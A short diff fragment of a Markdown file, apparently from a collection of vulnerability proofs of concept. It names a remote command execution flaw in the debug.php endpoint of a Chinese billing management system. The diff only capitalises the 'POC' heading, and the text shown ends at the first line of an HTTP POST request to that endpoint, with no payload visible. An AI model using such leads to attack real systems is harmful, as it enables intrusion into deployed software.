@@ -2,7 +2,7 @@
 
 蓝海卓越计费管理系统存在debug.php远程命令执行漏洞
 
-## poc
+## POC
 
 ```
 POST /debug.php?_t=0.297317996068593 HTTP/1.1
